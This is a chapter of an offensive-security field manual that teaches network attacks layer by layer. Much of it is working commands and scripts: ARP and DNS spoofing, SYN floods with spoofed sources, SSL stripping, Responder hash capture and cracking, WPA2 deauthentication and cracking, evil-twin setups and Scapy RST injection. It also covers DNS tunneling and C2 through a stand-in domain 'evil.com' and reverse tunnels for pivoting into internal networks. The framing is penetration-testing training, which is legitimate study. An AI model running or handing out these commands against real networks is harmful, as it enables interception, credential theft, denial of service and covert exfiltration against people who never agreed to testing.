# Chapter 17 — Network Warfare: TCP/IP From The Attacker's Perspective

**VADER-RCE Field Manual**
**Prerequisite**: Basic networking concepts (IP addresses, ports, protocols)
**Drill**: DRILLS/17_network_warfare/

---

## Why You Need This

Every exploit you've built so far operates on a single machine. Local
privilege escalation. Local file parsing. Local memory corruption. That's
important — but it's half the picture.

The moment you touch a network, everything changes. You're not just
attacking ONE system's memory. You're attacking the PROTOCOL — the rules
that millions of machines agree to follow. Break the protocol and you
break the trust between systems. Man-in-the-middle a connection and
you see everything. Hijack a session and you become someone else.

Networking textbooks teach you how packets flow. This chapter teaches
you how to BREAK that flow — intercept it, redirect it, inject into it,
tunnel through it. Every layer of the network stack is an attack surface.
Every protocol assumption is a trust boundary.

You already know the crash-leak-execute chain for memory corruption.
Networks have their own chain: **enumerate-intercept-exploit**. Find what's
running. Get between it and its destination. Make it do what you want.

---

## The OSI Model As A Kill Chain

Forget the textbook diagrams. Every layer of the OSI model is an attack
surface. When you look at the seven layers, you're looking at seven
different classes of attack.

### Layer 1 — Physical: The Wire Itself

The most overlooked attack surface because people think you need physical
access. You do — but physical access is easier to get than people assume.

**Attacks at Layer 1**:
- **Wiretapping**: Ethernet is electrical signals on copper. Tap the wire,
  read the signals. Fiber is harder (you need to bend it to leak light)
  but not impossible.
- **Rogue devices**: Drop a Raspberry Pi with a cellular modem on the
  network. Plug a WiFi Pineapple into an empty ethernet jack. Physical
  access for 30 seconds = persistent network access.
- **Jamming**: Wireless networks are radio. Flood the frequency and
  nothing gets through. Simple, brutal, effective for denial of service.

**Why it matters for you**: When you do physical penetration testing,
Layer 1 is how you establish a foothold. A $35 Pi Zero hidden behind
a printer gives you a pivot point into the internal network.

### Layer 2 — Data Link: MAC Addresses and Switches

This is where ARP lives. ARP is the protocol that maps IP addresses to
MAC addresses on a local network. It has ZERO authentication. Any device
can claim any MAC address. That's not a bug — it's how ARP was designed
in 1982 when networks were trusted.

**Attacks at Layer 2**:
- **ARP Spoofing/Poisoning**: Tell the victim "I'm the gateway" by
  broadcasting fake ARP replies. All their traffic routes through you.
  Classic MITM. Covered in detail below.
- **MAC Flooding**: Overwhelm a switch's CAM table with thousands of
  fake MAC addresses. When the table is full, the switch fails open —
  broadcasts everything to all ports like a hub. Now you can sniff all
  traffic on the segment.
- **VLAN Hopping**: If switch ports aren't properly configured, you can
  craft 802.1Q double-tagged frames to jump between VLANs. Send a frame
  tagged with the target VLAN nested inside a frame tagged with the
  native VLAN — the first switch strips the outer tag, the second switch
  routes based on the inner tag.
- **STP Manipulation**: The Spanning Tree Protocol prevents loops. Send
  forged BPDU packets claiming to be a root bridge with a lower priority.
  The network reconfigures itself to route traffic through you.

```bash
# MAC flood attack with macof (part of dsniff suite)
macof -i eth0 -n 100000

# ARP spoofing with arpspoof
# Tell victim (192.168.1.100) that you're the gateway (192.168.1.1)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# Also tell the gateway that you're the victim (bidirectional)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

### Layer 3 — Network: IP Addresses and Routing

IP has no built-in authentication either. The source address in an IP
packet is whatever the sender writes in the header. You can forge it.

**Attacks at Layer 3**:
- **IP Spoofing**: Forge the source IP in packets you send. Used for
  amplification attacks (send a request with the victim's IP as source;
  the response goes to the victim). Also used to bypass IP-based access
  controls that trust specific source addresses.
- **ICMP Tunneling**: ICMP (ping) packets have a data payload field.
  Nobody filters ICMP data content. Encapsulate your real traffic inside
  ICMP echo requests/replies and it flows right through firewalls that
  block everything except ping.
- **ICMP Redirect**: Send a forged ICMP redirect message telling a host
  to use a different gateway for a specific destination. The host updates
  its routing table. Your machine is now the "better route."
- **Source Routing**: IP headers can specify the exact route a packet
  should take. Most modern routers drop source-routed packets, but legacy
  networks and misconfigured devices still honor them.

```bash
# ICMP tunneling with icmpsh (attacker side — listener)
python icmpsh_m.py <attacker_ip> <victim_ip>

# ICMP tunneling with ptunnel (encapsulates TCP in ICMP)
# Proxy side (on compromised host):
ptunnel -x secretpassword
# Client side (on attacker):
ptunnel -p <proxy_ip> -lp 8080 -da <target_ip> -dp 22 -x secretpassword
# Now SSH to localhost:8080 and it tunnels through ICMP to target:22
```

### Layer 4 — Transport: TCP and UDP

This is where most of the interesting offensive action happens. TCP's
reliability mechanisms — sequence numbers, acknowledgments, connection
state — create exploitable assumptions.

**Attacks at Layer 4**:
- **SYN Flood**: Send thousands of SYN packets with spoofed source IPs.
  The target allocates connection state for each one, waiting for the
  third step of the handshake that never comes. Connection table fills up.
  Legitimate connections can't get through.
- **TCP Hijacking**: If you can predict or observe TCP sequence numbers,
  you can inject packets into an existing connection. The receiving end
  accepts them because the sequence numbers are valid.
- **RST Injection**: Send a forged RST (reset) packet with valid sequence
  numbers to tear down someone else's connection. Used by the Great
  Firewall of China to kill connections to banned sites.
- **UDP Amplification**: Some UDP services respond with much more data
  than the request contained. DNS responds to a ~60-byte query with
  up to ~4000 bytes. NTP monlist responds to a 234-byte request with
  up to 100x the data. Spoof the source IP to the victim's address
  and amplify your bandwidth by 50-100x.

```bash
# SYN flood with hping3
hping3 -S --flood -V -p 80 <target_ip>

# SYN flood with spoofed source
hping3 -S --flood -V -p 80 --rand-source <target_ip>

# TCP RST injection (requires knowing current sequence number)
# Scapy example below in packet crafting section
```

### Layer 5 — Session: Connection Management

Session layer attacks target the mechanisms that maintain state between
requests. HTTP is stateless, so applications bolt on session management
with cookies, tokens, and session IDs.

**Attacks at Layer 5**:
- **Session Hijacking**: Steal a session cookie and you ARE that user.
  The server can't tell the difference. XSS, network sniffing, or
  predictable session IDs all get you there.
- **Session Fixation**: Force the victim to use a session ID you already
  know. Set the cookie before they log in. When they authenticate, that
  known session ID is now authenticated.
- **SSL/TLS Session Attacks**: Renegotiation attacks, session resumption
  abuse, ticket key reuse.

### Layer 6 — Presentation: Data Formatting

This layer handles encryption, compression, and encoding. The attack
surface is the transition between encrypted and plaintext states.

**Attacks at Layer 6**:
- **SSL Stripping**: Downgrade an HTTPS connection to HTTP. The victim
  thinks they're secure (or doesn't notice the missing padlock). You
  see everything in plaintext. Tool: `sslstrip`.
- **Encoding Attacks**: Unicode normalization, double encoding, charset
  manipulation. These bypass input validation filters by encoding
  malicious characters in unexpected ways.

```bash
# SSL stripping with mitmproxy
# 1. ARP spoof to get traffic flowing through you
# 2. Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
# 3. Redirect HTTP traffic to sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# 4. Run sslstrip
sslstrip -l 8080
```

### Layer 7 — Application: Protocol-Specific Attacks

Every application protocol has its own attack surface. HTTP, DNS, SMB,
SMTP, FTP — each one has decades of vulnerabilities.

**Attacks at Layer 7**:
- **DNS Poisoning**: Inject false DNS records so domains resolve to your
  IP. Victim types `bank.com`, their DNS cache says that's `10.0.0.5`
  (your server). You serve a perfect clone. Credentials harvested.
- **SMB Relay**: Capture an NTLM authentication attempt and relay it to
  another server in real time. You never crack the hash — you just
  forward the authentication and ride the session.
- **HTTP Request Smuggling**: Exploit differences in how front-end and
  back-end servers parse HTTP headers (Content-Length vs Transfer-Encoding)
  to inject requests into other users' connections.
- **SMTP Spoofing**: Email protocols have no built-in sender verification
  (SPF/DKIM/DMARC are bolted-on fixes). Forge the From header and send
  emails as anyone.

---

## TCP/IP Internals For Exploitation

### The Three-Way Handshake — Why It Matters

Every TCP connection starts the same way:

```
Client  → SYN (seq=X)           → Server
Client  ← SYN-ACK (seq=Y, ack=X+1) ← Server
Client  → ACK (seq=X+1, ack=Y+1) → Server
```

**X** is the client's Initial Sequence Number (ISN). **Y** is the server's
ISN. After this exchange, both sides know each other's sequence numbers
and the connection is ESTABLISHED.

**Why you care**:
1. **Port scanning depends on this**. A SYN scan sends the first packet
   and watches the response. SYN-ACK = port open. RST = port closed.
   No response = filtered (firewall dropping packets).
2. **Sequence number prediction** is what makes TCP hijacking possible.
   If you can predict or observe Y (the server's ISN), you can inject
   packets that the server accepts as legitimate.
3. **The half-open state** (SYN received, SYN-ACK sent, waiting for ACK)
   consumes server resources. That's why SYN floods work — you leave
   thousands of connections in this half-open state.

### TCP Sequence Numbers — The Trust Mechanism

TCP uses sequence numbers to ensure ordered, reliable delivery. Each
byte of data has a sequence number. The receiver uses acknowledgment
numbers to confirm receipt.

**Historical vulnerability**: Early TCP implementations used predictable
ISN generation (simple counters or time-based increments). If you could
predict the ISN, you could blind-inject packets into a connection without
even seeing the server's responses. Modern OSes use cryptographic random
ISN generation (RFC 6528), but the principle matters:

```
# Old-style ISN: increment by 128,000 every second, 64,000 per connection
# If current ISN = 1,000,000 and you initiate at time T:
#   Next ISN ≈ 1,000,000 + (elapsed_ms * 128) + (connections * 64000)
# Predictable enough to exploit

# Modern ISN: hash(src_ip, dst_ip, src_port, dst_port, secret_key, time)
# Unpredictable without the secret key
```

**What you CAN still do**:
- If you're on the same network (MITM position), you can OBSERVE the
  actual sequence numbers and inject with precision.
- TCP window probing lets you infer information about connection state
  even without being in the path.

### RST Injection

If you know the current sequence number of a connection, you can kill it:

```python
# Scapy — RST injection to kill a TCP connection
from scapy.all import *

# You need: src_ip, dst_ip, src_port, dst_port, and a valid seq number
# The seq must be within the receiver's TCP window
ip = IP(src="10.0.0.50", dst="10.0.0.100")
tcp = TCP(sport=12345, dport=80, flags="R", seq=<observed_seq_number>)
send(ip/tcp)
```

The receiver gets a packet that looks like it came from the other end
of the connection saying "RESET." Connection torn down. The Great Firewall
does this to every connection containing forbidden keywords — it races
the real packets and delivers the RST first.

### TCP Window Manipulation

The TCP window field tells the sender how much data the receiver can
accept. Manipulating this lets you:
- **Slow connections to a crawl**: Advertise a tiny window (1 byte).
  The sender sends 1 byte at a time. Connection technically alive but
  useless. This is the Slowloris principle applied at the TCP level.
- **Probe connections**: Send a packet with a specific window size
  and observe how the target responds. The response reveals connection
  state information.

---

## Reconnaissance Techniques

### Port Scanning With Nmap

Nmap is the standard. Every scan type exploits a different aspect of
TCP/IP behavior:

```bash
# SYN scan (default, requires root) — half-open, fast, stealthy
# Sends SYN, reads response, never completes handshake
# SYN-ACK = open, RST = closed, no response = filtered
sudo nmap -sS <target>

# TCP connect scan (no root needed) — full handshake
# Completes the three-way handshake on each port
# More reliable but LOUDER — shows up in connection logs
nmap -sT <target>

# UDP scan — slow as hell but necessary
# Sends empty UDP packets (or protocol-specific payloads)
# ICMP port-unreachable = closed, no response = open|filtered
sudo nmap -sU <target>

# XMAS scan — sets FIN, PSH, URG flags simultaneously
# RFC 793 says: if port closed, send RST. If open, drop silently.
# Only works against RFC-compliant stacks (not Windows)
sudo nmap -sX <target>

# NULL scan — no flags set at all
# Same logic as XMAS — RST = closed, silence = open|filtered
sudo nmap -sN <target>

# FIN scan — only FIN flag set
# Same logic again. Useful for sneaking past stateless firewalls
# that only filter SYN packets
sudo nmap -sF <target>

# ACK scan — doesn't find open ports, finds FIREWALL RULES
# If RST comes back = unfiltered (firewall lets it through)
# If nothing comes back = filtered (firewall dropped it)
sudo nmap -sA <target>

# Version detection — probe open ports for service info
nmap -sV <target>

# OS fingerprinting — analyze TCP/IP stack behavior
# TTL values, window sizes, TCP options, DF bit, etc.
sudo nmap -O <target>

# Aggressive scan — OS detection + version + scripts + traceroute
sudo nmap -A <target>

# Scan specific ports
nmap -p 80,443,8080 <target>
nmap -p 1-1024 <target>        # first 1024 ports
nmap -p- <target>               # all 65535 ports (slow but thorough)

# Speed control — T0 (paranoid) to T5 (insane)
nmap -T4 <target>    # fast and reasonably quiet
nmap -T1 <target>    # slow, evades basic IDS

# Output formats
nmap -oN scan.txt <target>     # normal text
nmap -oX scan.xml <target>     # XML (for parsing)
nmap -oG scan.grep <target>    # grepable format
nmap -oA scan_all <target>     # all three formats
```

### Service Enumeration and Banner Grabbing

Once you know what ports are open, figure out what's RUNNING on them:

```bash
# Nmap service version detection (aggressive)
nmap -sV --version-intensity 5 <target>

# Manual banner grab with netcat
nc -nv <target> 80
# Then type:
# HEAD / HTTP/1.1
# Host: target.com
# (two blank lines)

# Banner grab with curl
curl -I http://<target>

# Grab SSH banner
nc -nv <target> 22

# Grab SMTP banner
nc -nv <target> 25
```

### DNS Enumeration

DNS is a goldmine. Subdomains reveal internal services, development
environments, admin panels — things that shouldn't be public-facing.

```bash
# Zone transfer attempt (AXFR)
# If the DNS server allows zone transfers, you get EVERY record
dig axfr @<dns_server> <domain>
# Most servers block this, but you'd be surprised how many don't

# Subdomain brute force with gobuster
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse DNS lookup on an IP range
# Find what hostnames point to IPs in a range
for ip in $(seq 1 254); do
    host 10.0.0.$ip | grep "name pointer"
done

# DNS record types to query
dig <domain> A      # IPv4 address
dig <domain> AAAA   # IPv6 address
dig <domain> MX     # Mail servers
dig <domain> NS     # Name servers
dig <domain> TXT    # Text records (often SPF, DKIM, verification tokens)
dig <domain> CNAME  # Aliases
dig <domain> SOA    # Start of Authority
dig <domain> ANY    # Request all records (many servers refuse this now)
```

### SNMP Walking

SNMP (Simple Network Management Protocol) versions 1 and 2c use
"community strings" as passwords — and the default is literally "public."

```bash
# SNMP walk — dump everything the device will tell you
snmpwalk -v 2c -c public <target>

# Common OIDs to query:
# 1.3.6.1.2.1.1.1.0 — System description
# 1.3.6.1.2.1.1.5.0 — System name
# 1.3.6.1.2.1.25.4.2.1.2 — Running processes
# 1.3.6.1.2.1.25.6.3.1.2 — Installed software
# 1.3.6.1.4.1.77.1.2.25 — Windows user accounts

# Enumerate community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# Brute force SNMP with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target> snmp
```

---

## Man-in-the-Middle Attacks

MITM is the crown jewel of network warfare. Get between two systems
and you control the conversation. You can read it, modify it, redirect
it, or drop it entirely.

### ARP Cache Poisoning — The Classic

ARP maps IP addresses to MAC addresses on a local network. It's
completely unauthenticated. Any device can send an ARP reply saying
"IP 10.0.0.1 is at MAC aa:bb:cc:dd:ee:ff" and every device on the
segment UPDATES ITS CACHE without question.

**How it works**:

```
Normal state:
  Victim ARP cache:  Gateway 10.0.0.1 → MAC 00:11:22:33:44:55 (real)
  Gateway ARP cache: Victim 10.0.0.100 → MAC aa:bb:cc:dd:ee:ff (real)

After poisoning:
  Victim ARP cache:  Gateway 10.0.0.1 → MAC <YOUR_MAC> (fake)
  Gateway ARP cache: Victim 10.0.0.100 → MAC <YOUR_MAC> (fake)

Now ALL traffic between victim and gateway flows through you.
```

**Execution**:

```bash
# Enable IP forwarding (so traffic actually passes through, not just dies)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison with arpspoof (bidirectional)
arpspoof -i eth0 -t <victim_ip> <gateway_ip> &
arpspoof -i eth0 -t <gateway_ip> <victim_ip> &

# Or use ettercap (combines ARP spoofing + sniffing)
ettercap -T -M arp:remote /<victim_ip>// /<gateway_ip>//

# Or use bettercap (modern, scriptable)
bettercap -iface eth0
# In bettercap console:
net.probe on
set arp.spoof.targets <victim_ip>
arp.spoof on
net.sniff on
```

### DNS Spoofing

Once you're in a MITM position, you can intercept DNS queries and
respond with forged answers before the real DNS server does.

```bash
# With bettercap:
set dns.spoof.domains bank.com,login.bank.com
set dns.spoof.address <your_ip>
dns.spoof on

# Now when the victim resolves bank.com, they get YOUR IP.
# Serve a phishing page on your server and harvest credentials.

# With dnschef (standalone DNS proxy):
dnschef --fakeip <your_ip> --fakedomains bank.com -i <your_ip>
```

### LLMNR / NBT-NS Poisoning With Responder

This is the bread and butter of internal Windows network pentesting.
When a Windows machine can't resolve a hostname via DNS, it falls back
to broadcast protocols:
1. **LLMNR** (Link-Local Multicast Name Resolution)
2. **NBT-NS** (NetBIOS Name Service)

These are BROADCAST queries — every machine on the subnet hears them.
Responder answers these broadcasts and says "Yeah, that's me." The
victim sends its NTLM authentication hash to your machine.

```bash
# Run Responder — listens for LLMNR/NBT-NS broadcasts
sudo responder -I eth0 -wrf

# What happens:
# 1. User types \\fileserverr (typo) in Windows Explorer
# 2. DNS can't resolve "fileserverr" — no such hostname
# 3. Machine broadcasts LLMNR/NBT-NS query: "Anyone know fileserverr?"
# 4. Responder answers: "That's me! Authenticate here."
# 5. Victim sends NTLMv2 hash to Responder
# 6. Responder logs the hash

# Captured hashes look like:
# [SMB] NTLMv2-SSP Hash : domain\user::domain:challenge:response:blob
# Crack with hashcat:
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

**Why this is devastating**: It requires zero exploitation. No buffer
overflow. No malware. Just a machine answering a broadcast question
that nobody else answered first. And it catches EVERYONE who mistypes
a hostname or references a server that no longer exists.

### WPAD Exploitation

Web Proxy Auto-Discovery Protocol. Windows machines automatically look
for a proxy configuration file at `http://wpad.<domain>/wpad.dat`. If
DNS doesn't have a WPAD record, the machine falls back to LLMNR/NBT-NS.

Responder serves a malicious WPAD file that routes all HTTP traffic
through your proxy. Now you're intercepting web traffic passively.

```bash
# Responder with WPAD enabled (default)
sudo responder -I eth0 -wrf

# The -w flag enables WPAD rogue proxy
# The -r flag enables answers for NetBIOS wredir suffix queries
# The -f flag enables fingerprinting
```

---

## Tunneling and Pivoting

You've compromised one machine on the internal network. Now you need
to reach systems that aren't directly accessible from your attack box.
Tunneling encapsulates your traffic inside allowed protocols. Pivoting
uses the compromised host as a relay to reach deeper networks.

### SSH Tunneling

The Swiss Army knife of tunneling. Three modes:

**Local Port Forward** — Access a remote service through your local machine:
```bash
# Forward local port 8080 to internal_server:80 through the compromised host
ssh -L 8080:internal_server:80 user@compromised_host

# Now http://localhost:8080 reaches internal_server:80
# The compromised host makes the connection to internal_server on your behalf
# Your traffic to internal_server is encrypted inside the SSH tunnel

# Multiple forwards in one command:
ssh -L 8080:web_server:80 -L 3389:rdp_server:3389 user@compromised_host
```

**Remote Port Forward** — Expose your local service through the remote machine:
```bash
# Make your local port 4444 accessible as port 9999 on the compromised host
ssh -R 9999:localhost:4444 user@compromised_host

# Now anyone connecting to compromised_host:9999 reaches your localhost:4444
# Useful for reverse shells when direct connections are blocked
```

**Dynamic Port Forward (SOCKS Proxy)** — Turn the SSH connection into a
full SOCKS proxy:
```bash
# Create a SOCKS proxy on local port 1080
ssh -D 1080 user@compromised_host

# Configure your tools to use SOCKS proxy at localhost:1080
# ALL traffic through the proxy exits from the compromised host
# No need to specify individual port forwards

# Use with proxychains:
# /etc/proxychains.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn internal_network/24
proxychains curl http://internal_web_app
```

### DNS Tunneling

DNS traffic is almost never blocked. Even heavily filtered networks
allow DNS queries to resolve hostnames. Abuse this to exfiltrate data
or maintain C2 channels.

**How it works**:
1. You control a domain (e.g., `evil.com`) and its authoritative DNS server
2. The client encodes data in DNS queries: `base64data.evil.com`
3. Your DNS server receives the query, decodes the data
4. Response data is encoded in DNS TXT or CNAME records
5. Slow as fuck — DNS has payload size limits — but it WORKS through
   almost any firewall

```bash
# iodine — IP-over-DNS tunnel
# Server (on your DNS server for evil.com):
iodined -f -c -P secretpass 10.0.0.1 tunnel.evil.com

# Client (on compromised machine):
iodine -f -P secretpass tunnel.evil.com

# Now you have a virtual interface (dns0) with IP 10.0.0.2
# Full IP connectivity through DNS queries. Slow but invisible.

# dnscat2 — C2 over DNS
# Server:
dnscat2-server evil.com

# Client:
./dnscat --dns=server=<dns_server>,domain=evil.com
```

### ICMP Tunneling

Same principle as DNS tunneling but over ICMP (ping). The data payload
of ICMP echo requests/replies carries your tunnel traffic.

```bash
# ptunnel-ng — TCP over ICMP
# Server (on compromised host):
ptunnel-ng -r<target_ip> -R22

# Client (on attacker):
ptunnel-ng -p<compromised_host> -l2222 -r<target_ip> -R22
ssh -p 2222 user@localhost
# SSH connection tunneled through ICMP to the target
```

### Chisel — Modern HTTP Tunneling

Chisel is a fast TCP/UDP tunnel transported over HTTP, secured via SSH.
Single binary, cross-platform. This is the modern standard for pivoting.

```bash
# Server (on attacker):
chisel server -p 8080 --reverse

# Client (on compromised host):
chisel client <attacker_ip>:8080 R:socks

# Now you have a SOCKS proxy on attacker port 1080
# All traffic through it exits from the compromised host

# Forward specific ports:
chisel client <attacker_ip>:8080 R:3389:internal_rdp:3389

# Chisel through a web proxy (if only HTTP/HTTPS is allowed out):
chisel client --proxy http://corporate_proxy:8080 <attacker>:443 R:socks
```

### Ligolo-ng — Agent-Based Pivoting

Ligolo-ng creates a virtual network interface on your attacker machine
that routes directly into the target network. No SOCKS configuration
needed — just add routes and use your tools normally.

```bash
# Proxy (on attacker):
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Agent (on compromised host):
ligolo-agent -connect <attacker_ip>:11601 -ignore-cert

# In ligolo proxy console:
session           # select the agent session
ifconfig          # see internal network interfaces
start             # start the tunnel

# On attacker — add routes to internal network:
sudo ip route add 10.10.10.0/24 dev ligolo
# Now you can directly access 10.10.10.0/24 from your attack box
# nmap, curl, smbclient — everything works natively. No proxychains.
```

### Proxychains Configuration

When using SOCKS proxies for pivoting, proxychains forces any application
through the proxy:

```bash
# /etc/proxychains4.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080

# Chain multiple proxies (pivot through multiple hosts):
# socks5 127.0.0.1 1080   # first pivot
# socks5 127.0.0.1 1081   # second pivot (set up on first pivot host)

# Usage:
proxychains nmap -sT -Pn -p 80,443,445 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p password
proxychains smbclient \\\\10.10.10.50\\share -U admin
```

---

## Packet Crafting With Scapy

Scapy lets you build packets from scratch. Every field, every flag,
every byte — you control it all. This is how you test firewall rules,
fuzz protocols, and build custom exploits.

### Basic Packet Construction

```python
from scapy.all import *

# Build an IP packet
ip = IP(dst="10.0.0.100")

# Build a TCP SYN packet
tcp = TCP(dport=80, flags="S", seq=1000)

# Stack layers with /
packet = ip/tcp
packet.show()    # inspect all fields

# Send and receive (sr = send/receive, sr1 = send/receive one response)
response = sr1(packet, timeout=2)

# Send without waiting for response (useful for floods)
send(packet)

# Send at Layer 2 (specify ethernet header too)
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
sendp(eth/ip/tcp)
```

### Practical Examples

```python
from scapy.all import *

# ---- SYN scan (like nmap -sS) ----
def syn_scan(target, ports):
    for port in ports:
        resp = sr1(IP(dst=target)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:    # SYN-ACK = open
                print(f"[+] Port {port}: OPEN")
                # Send RST to close (don't complete handshake)
                send(IP(dst=target)/TCP(dport=port, flags="R", seq=resp[TCP].ack), verbose=0)
            elif resp[TCP].flags == 0x14:  # RST-ACK = closed
                pass  # closed, move on
        else:
            print(f"[?] Port {port}: FILTERED (no response)")

syn_scan("10.0.0.100", range(1, 1025))

# ---- ARP scan (discover hosts on LAN) ----
def arp_scan(network):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                     timeout=2, verbose=0)
    for sent, received in ans:
        print(f"[+] {received.psrc} is at {received.hwsrc}")

arp_scan("192.168.1.0/24")

# ---- ICMP ping sweep ----
def ping_sweep(network_prefix):
    for i in range(1, 255):
        target = f"{network_prefix}.{i}"
        resp = sr1(IP(dst=target)/ICMP(), timeout=0.5, verbose=0)
        if resp:
            print(f"[+] {target} is alive")

ping_sweep("192.168.1")

# ---- DNS query crafting ----
dns_req = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_req, timeout=2, verbose=0)
print(response[DNS].summary())

# ---- TCP RST injection (kill someone's connection) ----
# Requires sniffing to get current sequence number
def rst_inject(src_ip, dst_ip, src_port, dst_port, seq_num):
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port,
                                          flags="R", seq=seq_num)
    send(pkt, verbose=0)
    print(f"[+] RST sent: {src_ip}:{src_port} → {dst_ip}:{dst_port}")
```

### Protocol Fuzzing With Scapy

```python
from scapy.all import *
import random

# Fuzz TCP options — send packets with random TCP option fields
def fuzz_tcp_options(target, port):
    for i in range(1000):
        # fuzz() randomizes fields
        pkt = IP(dst=target)/fuzz(TCP(dport=port))
        send(pkt, verbose=0)

# Fuzz DNS — send malformed DNS queries
def fuzz_dns(target):
    for i in range(1000):
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(1, 255)))
        pkt = IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=name,
              qtype=random.randint(1, 255)))
        send(pkt, verbose=0)

# Craft packets that should be dropped by firewalls
# Test if they actually ARE dropped
def firewall_test(target):
    # Christmas tree packet (all flags set)
    send(IP(dst=target)/TCP(dport=80, flags="FSRPAUEC"), verbose=0)
    # NULL packet (no flags)
    send(IP(dst=target)/TCP(dport=80, flags=""), verbose=0)
    # Invalid flag combinations
    send(IP(dst=target)/TCP(dport=80, flags="SE"), verbose=0)  # SYN+ECE
```

---

## Wireless Attacks

Brief — just enough to understand the attack surface. Wireless adds
a physical-layer dimension that wired networks don't have.

### WPA2 Handshake Capture and Cracking

WPA2 uses a four-way handshake to derive the session key from the
Pre-Shared Key (PSK). If you capture this handshake, you can brute-force
the PSK offline.

```bash
# 1. Put wireless adapter in monitor mode
sudo airmon-ng start wlan0
# Adapter becomes wlan0mon

# 2. Scan for target networks
sudo airodump-ng wlan0mon
# Note the BSSID (MAC) and channel of your target

# 3. Focus capture on target network
sudo airodump-ng -c <channel> --bssid <target_bssid> -w capture wlan0mon

# 4. Force a client to reconnect (deauthentication attack)
# This disconnects a client so they re-authenticate, generating a fresh handshake
sudo aireplay-ng -0 5 -a <target_bssid> -c <client_mac> wlan0mon
# -0 5 = send 5 deauth frames

# 5. Wait for "WPA handshake: <bssid>" in airodump-ng output
# The handshake is in capture-01.cap

# 6. Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 7. Or convert to hashcat format for GPU cracking
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### Deauthentication Attacks

802.11 management frames (including deauth) are NOT encrypted or
authenticated in WPA2. Anyone can send them. This means:

- You can disconnect any client from any network at any time
- You can force reconnections to capture handshakes
- You can create a denial-of-service against WiFi networks
- WPA3 fixes this with Protected Management Frames (PMF)

```bash
# Deauth flood — kick everyone off a network
sudo aireplay-ng -0 0 -a <target_bssid> wlan0mon
# -0 0 = continuous deauth (0 = unlimited)

# Targeted deauth — kick one specific client
sudo aireplay-ng -0 10 -a <target_bssid> -c <client_mac> wlan0mon

# With mdk4 (more features):
sudo mdk4 wlan0mon d -B <target_bssid>
```

### Evil Twin Attack

Create a fake access point with the same SSID as a legitimate network.
Clients connect to yours instead (because your signal is stronger or
the real AP is being deauth'd).

```bash
# Using hostapd-mana for the evil twin AP:
# hostapd-mana.conf:
interface=wlan1
driver=nl80211
ssid=TargetNetworkName
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=doesntmatter
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP

# Start the evil twin:
sudo hostapd-mana hostapd-mana.conf

# Set up DHCP for connected victims:
sudo dnsmasq -C dnsmasq.conf

# Route traffic through your machine:
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Now capture credentials with a captive portal, MITM their traffic,
# or serve malicious content
```

---

## Putting It All Together — Attack Chains

Isolated techniques are demonstrations. Chained techniques are operations.
Here's how these pieces combine in real engagements:

### External to Internal

```
1. DNS enumeration → discover subdomains → find dev.target.com
2. Port scan dev.target.com → find exposed service on 8443
3. Service enumeration → identify vulnerable application
4. Exploit → shell on DMZ host
5. Pivot → SSH tunnel through DMZ to internal network
6. Internal scan → discover domain controller, file servers
7. Responder → capture NTLM hashes from broadcast poisoning
8. Crack hashes → domain user credentials
9. Lateral movement → more access, more hashes
10. Domain admin → game over
```

### Internal Network (Assume Breach)

```
1. ARP scan → discover live hosts
2. Responder → poison LLMNR/NBT-NS → capture NTLMv2 hashes
3. Crack or relay hashes → access to first machine
4. Dump local credentials → find cached domain creds
5. Pivot through compromised hosts → reach segregated networks
6. Kerberoast → crack service account hashes
7. Find domain admin credentials → full domain compromise
```

The network is not a destination. It's the highway between targets.
Every technique in this chapter is a way to control that highway —
who can drive on it, where they go, and what they see along the way.

---

## Summary — Key Takeaways

- **Every OSI layer is an attack surface.** From wiretapping (Layer 1) to
  application protocol abuse (Layer 7). Security must exist at EVERY layer
  because attackers can operate at ANY layer.

- **ARP has zero authentication.** ARP poisoning is trivial on any local
  network without ARP inspection. This gives you MITM position — which
  enables DNS spoofing, credential capture, traffic modification.

- **The TCP three-way handshake is exploitable.** SYN floods exploit the
  half-open state. Sequence number knowledge enables hijacking and RST
  injection. Port scanning exploits the different responses to different
  flag combinations.

- **LLMNR/NBT-NS poisoning is the easiest win on internal Windows
  networks.** Responder captures NTLM hashes from normal user behavior.
  No exploitation required. No malware. Just answering broadcast questions.

- **DNS tunneling works through almost any firewall.** If DNS is allowed
  (and it almost always is), you have a covert channel. Slow but reliable.
  Same principle applies to ICMP tunneling.

- **Pivoting converts one compromised host into access to the entire
  internal network.** SSH tunneling, chisel, ligolo-ng, proxychains —
  know at least two methods cold.

- **Scapy gives you complete control over packet construction.** Custom
  scans, protocol fuzzing, firewall testing, exploit development —
  when nmap and standard tools aren't enough, build the packet yourself.

